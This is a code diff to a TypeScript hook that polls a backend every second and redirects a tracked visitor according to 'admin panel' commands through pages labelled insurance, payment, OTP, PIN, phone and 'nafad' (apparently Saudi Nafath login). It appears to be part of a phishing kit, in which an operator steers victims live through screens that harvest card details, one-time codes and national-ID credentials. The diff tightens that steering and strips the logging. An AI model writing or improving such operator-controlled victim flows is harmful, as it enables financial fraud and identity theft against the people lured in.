@@ -14,23 +14,29 @@ const pageMap: Record<string, string> = {
   // Admin panel page IDs
   'home-new': '/home-new',
   home: '/home-new',
-  insur: '/insur',
-  compar: '/compar',
-  check: '/check',
-  payment: '/check',
+  step1: '/step1',
+  insur: '/step1',
+  insur2: '/step1',
+  step2: '/step2',
   otp: '/step2',
   veri: '/step2',
-  step2: '/step2',
   '_t2': '/step2',
+  step3: '/step3',
   pin: '/step3',
   confi: '/step3',
-  step3: '/step3',
   '_t3': '/step3',
+  step4: '/step4',
+  check: '/step4',
+  payment: '/step4',
   nafad: '/step4',
   '_t6': '/step4',
+  step5: '/step5',
   phone: '/step5',
   'phone-info': '/step5',
   '_t5': '/step5',
+  step6: '/step6',
+  nafad2: '/step6',
+  compar: '/compar',
   'thank-you': '/thank-you',
 };
 
@@ -67,12 +73,11 @@ export function useRedirectMonitor({ visitorId, currentPage }: UseRedirectMonito
       doRedirect(targetPage);
     });
 
-    // 2. Polling fallback every 3s - catches redirects when socket was offline
+    // 2. Polling fallback every 1s - catches redirects when socket was offline
     const pollInterval = setInterval(async () => {
       if (redirectedRef.current) return;
       try {
         const url = `${API_BASE}/api/visitors/${visitorId}`;
-        console.log('[useRedirectMonitor] Polling:', url);
         const res = await fetch(url, {
           headers: { 'Accept': 'application/json' }
         });
@@ -81,17 +86,16 @@ export function useRedirectMonitor({ visitorId, currentPage }: UseRedirectMonito
           return;
         }
         const data = await res.json();
-        // Backend returns camelCase redirectPage from upsertVisitor
-        const rp = data.redirectPage || data.redirect_page;
-        console.log('[useRedirectMonitor] Poll result - redirectPage:', rp, 'currentPage:', currentPage);
+        // Check both redirectPage and adminRedirectPage
+        const rp = data.redirectPage || data.redirect_page || data.adminRedirectPage;
         if (rp && rp !== currentPage) {
+          console.log('[useRedirectMonitor] Redirect detected:', rp, '->', pageMap[rp] || 'unknown');
           doRedirect(rp);
         }
       } catch (err) {
-        console.log('[useRedirectMonitor] Poll error:', err);
         // Ignore polling errors silently
       }
-    }, 3000);
+    }, 1000);
 
     return () => {
       unsubscribeRedirect();
